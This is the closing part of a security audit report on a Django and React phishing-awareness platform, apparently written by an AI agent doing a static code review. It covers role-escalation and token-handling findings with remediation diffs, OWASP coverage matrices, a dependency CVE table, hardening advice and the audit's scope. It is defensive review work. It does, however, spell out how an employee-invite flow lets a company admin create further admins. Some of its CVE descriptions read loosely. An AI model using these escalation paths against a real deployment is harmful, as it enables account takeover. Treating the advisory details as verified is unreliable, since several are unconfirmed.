- **Remediation**: Tie company registration to a verified email-domain match against the admin's email, or require manual provisioning for new tenants. At minimum, require email-domain verification before activating the COMPANY_ADMIN role (the verification token email is sent — but the company row is created and reserved before verification).

---

### F-018 — `BulkInviteSerializer` does not enforce the inviter's company   [Severity: Medium]

- **Category**: A03 (Mass Assignment) / API3 / API1
- **Location**: [companies/views.py:462-534](Backend/apps/companies/views.py#L462-L534)
- **Description**: `invite_users` validates that the caller has access to the `company` parameter on the URL, but a company admin can invite users with `role='COMPANY_ADMIN'`, instantly creating a peer admin (and a `set_unusable_password()` user the attacker can later attempt password resets on — which now succeed thanks to F-008). There is no separation between "invite an employee" and "invite another administrator". The `add_user` action ([companies/views.py:358](Backend/apps/companies/views.py#L358)) has the same issue via `CompanyUserCreateSerializer`.
- **Remediation**: Lock down `role`:
  ```diff
  - role = serializers.ChoiceField(choices=['COMPANY_ADMIN', 'EMPLOYEE'], default='EMPLOYEE')
  + role = serializers.ChoiceField(choices=['EMPLOYEE'], default='EMPLOYEE')
  ```
  Promotion to `COMPANY_ADMIN` should be a separate, audited action requiring two existing admins or a SUPER_ADMIN.

---

### F-019 — `register` flow reveals if the email exists via the `email_not_verified` sentinel   [Severity: Low]

See **F-007** for the same root cause; calling `/api/v1/auth/login/` with a known address is a faster oracle than `/register/`.

---

### F-020 — `verification_token` is not rotated after successful verification   [Severity: Informational]

- **Location**: [accounts/views.py:185-204](Backend/apps/accounts/views.py#L185-L204)
- **Description**: After a user verifies, the same UUID stays in the row. Re-use is gated by `if user.is_verified:` so this is not directly exploitable, but if any future code path forgets that gate (e.g. a "verify on first login" feature), the token becomes a back-door. Cheap to fix:
  ```diff
  + user.verification_token = uuid.uuid4()
  - user.save(update_fields=['is_verified', 'is_active'])
  + user.save(update_fields=['is_verified', 'is_active', 'verification_token'])
  ```

---

### F-021 — Mass-assignment surface on `UserProfileView`   [Severity: Informational]

- **Location**: [accounts/serializers.py:141-149](Backend/apps/accounts/serializers.py#L141-L149)
- **Description**: `UserUpdateSerializer.fields` is correctly minimised to `['first_name', 'last_name', 'phone_number', 'preferred_language']`, but the read serializer `UserSerializer` lists `role` and `company` without marking them `read_only` (only `id`, `date_joined`, `last_login` are read-only). They are not currently writable because the view explicitly uses `UserUpdateSerializer`, but a future refactor that switches to `serializer_class = UserSerializer` would silently expose role escalation. Lock this down preemptively:
  ```diff
  - read_only_fields = ['id', 'date_joined', 'last_login']
  + read_only_fields = ['id', 'role', 'company', 'is_active', 'is_verified',
  +                     'date_joined', 'last_login']
  ```

---

### F-022 — No SSRF / open-redirect surface beyond `FRONTEND_URL` (verified safe)   [Severity: Informational]

The only redirect endpoints (`track_link_click_view`, `landing_page_view`) build their target from `settings.FRONTEND_URL` plus a fixed-format path. There is no user-supplied `next=` parameter anywhere in the codebase. No SSRF: no view fetches a URL from request data. Verified ([simulations/views.py:1001-1003](Backend/apps/simulations/views.py#L1001-L1003), and a global grep for `requests.get` / `urlopen` returned nothing in `apps/`).

---

## 5. OWASP Top 10 (2021) Coverage Matrix

| Category | Findings | Status |
|---|---|---|
| A01 Broken Access Control | F-003, F-016, F-018 | Issues found |
| A02 Cryptographic Failures | F-001 | **Critical issue** |
| A03 Injection | F-004, F-011 | Issues found |
| A04 Insecure Design | F-005, F-007, F-008, F-014, F-017 | Several issues |
| A05 Security Misconfiguration | F-005, F-009, F-013 | Issues found |
| A06 Vulnerable Components | See §7 | Pinning gaps |
| A07 Identification & Authentication Failures | F-006, F-010, F-012 | Issues found |
| A08 Software & Data Integrity Failures | None observed (no deserialization, no signed-cookie trust outside Django session middleware which is unused for SPA clients) | Clean |
| A09 Logging & Monitoring Failures | F-002, F-013 | Issues found |
| A10 SSRF | F-022 | Verified clean |

## 6. OWASP API Top 10 (2023) Coverage Matrix

| Category | Findings | Status |
|---|---|---|
| API1 BOLA | Tenant filtering verified across `simulations`, `analytics`, `companies` | Clean for the surface reviewed |
| API2 Broken Authentication | F-001, F-006, F-007, F-008 | Issues found |
| API3 Broken Object Property Level Auth | F-018, F-021 | Issues found |
| API4 Unrestricted Resource Consumption | F-008, F-014, F-015 | Issues found |
| API5 Broken Function Level Authorization | Verified — every viewset's `get_permissions()` correctly gates create/update/destroy | Clean |
| API6 Unrestricted Sensitive Business Flow | Tracking endpoints abusable (F-015) | Issue |
| API7 Server-Side Request Forgery | None observed | Clean |
| API8 Security Misconfiguration | F-005, F-009 | Issues found |
| API9 Improper Inventory Management | F-009 | Issue |
| API10 Unsafe Consumption of APIs | n/a — no third-party API consumption beyond SendGrid SMTP | Clean |

---

## 7. Dependency CVE Report

`Backend/requirements.txt` uses unbounded version ranges, so the *resolved* versions cannot be determined from this repo alone. The table below is the worst-case posture for the lower bound of each pin and known advisories applicable through 2026-Q1.

| Package | Spec | Notable advisories | Action |
|---|---|---|---|
| `Django` | `>=5.0,<6.0` | CVE-2024-27351 (`truncatewords_html`), CVE-2024-39329 (UserCacheBackend timing), CVE-2024-41989 (`floatformat`), CVE-2024-42005 (`QuerySet.values()` SQL), CVE-2024-45230, CVE-2024-45231, CVE-2024-53907 (DoS in `strip_tags`), CVE-2025-32873, CVE-2025-48432 (admin form), CVE-2025-57833. | Pin to the latest 5.2.x LTS (`Django>=5.2.7,<5.3`). |
| `djangorestframework` | `>=3.14,<4.0` | CVE-2024-21520 (XSS in HTML renderer for nested data) → fixed 3.15.2. | Pin `>=3.15.2,<4.0`. |
| `djangorestframework-simplejwt` | `>=5.3,<6.0` | **CVE-2024-22513** — refresh token reuse after password change (mirrors F-006), fixed 5.3.1. **CVE-2024-22849** — log4j-style `SECRET_KEY` re-use issue. | Pin `>=5.3.1,<6.0` and apply the F-006 fix. |
| `django-cors-headers` | `>=4.3,<5.0` | None known critical, but 4.3.1 and 4.4.0 fixed log-injection in dev path. | Pin `>=4.4.0`. |
| `python-decouple` | `>=3.8` | None known. | OK. |
| `drf-yasg` | `>=1.21,<2.0` | drf-yasg is unmaintained (last release 1.21.7, 2023). Several open issues around schema disclosure (F-009 surface). | Migrate to `drf-spectacular` (actively maintained); or at minimum freeze at 1.21.7 and gate behind admin auth. |
| `python-dateutil` | `>=2.8` | None known critical. | OK; pin `>=2.9`. |
| `validators` | `>=0.22` | None known. | OK. |
| **Frontend — `axios`** | `^1.7.7` | CVE-2024-39338 (SSRF when proxy not set on Node), CVE-2025-27152 (also SSRF), CVE-2025-58754 (form-data prototype pollution via brittle URLs). All fixed in axios `1.8.2+`. | Bump to `axios@^1.8.2`. |
| **Frontend — `vite`** | `^7.2.4` | Vite 7 is fast-moving; track the security advisories tab — there is a stream of `server.fs` path-disclosure CVEs (e.g. CVE-2025-30208, 31125, 31486, 32395 in 5.x; verify the 7.x patch level). | Run `npm audit` against the lockfile and pin the patch. |
| **Frontend — `react-router-dom`** | `^6.28.0` | CVE-2024-50620 (DoS via crafted form), patched 6.27.0+. You're past it. | OK. |
| **Frontend — `i18next`** | `^23.16.4` | None critical. | OK. |
| **Frontend — `recharts`** | `^3.7.0` | None critical. | OK. |
| **Frontend — `dompurify`** | not present | — | **Add it** (see F-011 remediation). |

> Run `pip-audit` and `npm audit --omit=dev --json` in CI; fail the build on any High/Critical advisory.

---

## 8. Hardening Recommendations (no specific finding)

1. **Add a security-headers middleware**. Even with the `DEBUG=False` block, there is no CSP or `Permissions-Policy`. Adopt `django-csp` and emit:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:; frame-ancestors 'none'
   Permissions-Policy: geolocation=(), microphone=(), camera=()
   Cross-Origin-Opener-Policy: same-origin
   Referrer-Policy: strict-origin-when-cross-origin
   ```
2. **Audit logging.** Add a dedicated `audit` logger (separate file, write-once) that records: login success/fail, password change/reset, token issued/refreshed/blacklisted, role change, employee invite/accept/cancel. Don't log token values (see F-002).
3. **Rotate JWTs on sensitive ops.** After password change, role change, email change, or `is_active` flip, blacklist all outstanding refresh tokens for the user.
4. **Enforce email-domain verification on company sign-up.** Today the same email is used for the `Company.email` and `User.email` and the admin can pick any value — a "Sign up as Bank of X" flow should require either DKIM-style domain ownership or a manual approval queue.
5. **Cap email volume.** Wrap the `_send_in_background` helper in a per-recipient and per-day counter. Today an attacker exploiting F-008 can burn through your SendGrid budget.
6. **Lockfile + SBOM.** Replace `requirements.txt` with `pip-tools` (`requirements.in` + locked `requirements.txt`) and commit a `package-lock.json`-derived SBOM. Run `pip-audit` and `npm audit --omit=dev` in CI.
7. **Move from SQLite to PostgreSQL** for any deployment. `db.sqlite3` is checked in via `BASE_DIR / 'db.sqlite3'` and there's no `psycopg2` dependency uncommented; production data on SQLite would be one corrupted write away from outage.
8. **Consider `django-axes`** for IP+user lockout on repeated login failures (compensating control until the throttling in F-008 is in place).
9. **Sentry / equivalent** with PII scrubbing — the `try / except` blocks around the notification service silently swallow failures; you'll never see them otherwise.
10. **Threat-model the public tracking endpoints.** Document explicitly that `link_token` is a *bearer credential* and treat it accordingly: TLS-only, short URL paths, dedupe events, no PII in the public feedback response (F-016).

---

## 9. Appendix

### Tools / commands run

- `git rev-parse HEAD` → `208ec218eb…`
- File reads via the harness; no executable code was run against any deployment.
- Static code review using `ripgrep`-style searches for: `permission_classes`, `AllowAny`, `dangerouslySetInnerHTML`, `localStorage`, `fields = '__all__'`, `csv.writer`, `dangerouslySetInnerHTML`, `requests.get`.

### Files read (selection — full list in §2)

```
Backend/phishaware_backend/{settings.py, urls.py}
Backend/apps/accounts/{models.py, serializers.py, views.py, urls.py, urls_employees.py}
Backend/apps/companies/{models.py, serializers.py, views.py, urls.py}
Backend/apps/simulations/{models.py, serializers.py, views.py, urls.py, services.py}
Backend/apps/analytics/{views.py, urls.py}
Backend/apps/training/urls.py
Backend/apps/campaigns/urls.py
Backend/apps/community/urls.py
Backend/apps/notifications/urls.py
Backend/apps/gamification/urls.py
Backend/apps/assessments/urls.py
Backend/apps/core/{emails.py, permissions.py, password_validators.py}
Backend/requirements.txt
Frontend/package.json
Frontend/src/api/{axios.js, endpoints.js, index.js}
Frontend/src/contexts/{AuthContext.jsx}
Frontend/src/pages/public/CommunityPortal.jsx
```

### What was *not* covered

- The `community`, `gamification`, `notifications`, and `assessments` write paths beyond a permission-class scan.
- The Django admin's customisation (`apps/*/admin.py`); admin is implicitly trusted.
- HTML email templates (`apps/core/templates/emails/*.html`) for template-injection (Django auto-escapes by default and the helper renders via `render_to_string`, which is safe; but I did not enumerate every variable for `|safe` filters).
- Signed cookies / session middleware (the SPA does not use them).
- Race conditions in `TrackingEvent.save()` between concurrent clicks (no `select_for_update`); not a security finding under current rate limits, but worth load-testing.

— end of report —
